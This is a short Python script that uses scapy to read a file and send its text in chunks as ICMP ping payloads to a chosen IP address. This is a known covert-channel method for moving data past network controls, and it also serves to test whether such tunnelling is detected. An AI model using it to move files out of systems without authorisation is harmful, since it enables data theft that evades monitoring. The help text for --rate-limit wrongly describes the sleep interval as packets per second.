from scapy.all import IP, ICMP, send
import sys
import os
import time
import logging
import argparse

def read_file_chunks(file_path, chunk_size):
    with open(file_path, 'r') as file:
        text = file.read()
    return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]

def send_icmp_ping(dest_ip, text_chunks, rate_limit=None):
    logging.info("Sending ICMP ping packets...")
    for i, chunk in enumerate(text_chunks, start=1):
        packet = IP(dst=dest_ip)/ICMP()/chunk
        send(packet, verbose=False)
        logging.info(f"Sent packet {i}/{len(text_chunks)}")
        if rate_limit:
            time.sleep(rate_limit)

def main():
    parser = argparse.ArgumentParser(description="Send data through ICMP ping packets")
    parser.add_argument("dest_ip", help="Destination IP address")
    parser.add_argument("file_path", help="Path to the file containing data to send")
    parser.add_argument("--chunk-size", type=int, default=32, help="Chunk size for data transmission (default: 32)")
    parser.add_argument("--rate-limit", type=float, help="Rate limit for packet transmission (packets per second)")

    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s",
                        datefmt="%Y-%m-%d %H:%M:%S", filename="icmp_generator.log", filemode="w")

    try:
        if not os.path.exists(args.file_path):
            raise FileNotFoundError(f"File '{args.file_path}' not found.")
        
        text_chunks = read_file_chunks(args.file_path, args.chunk_size)

        send_icmp_ping(args.dest_ip, text_chunks, rate_limit=args.rate_limit)
    except FileNotFoundError as e:
        logging.error(e)
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
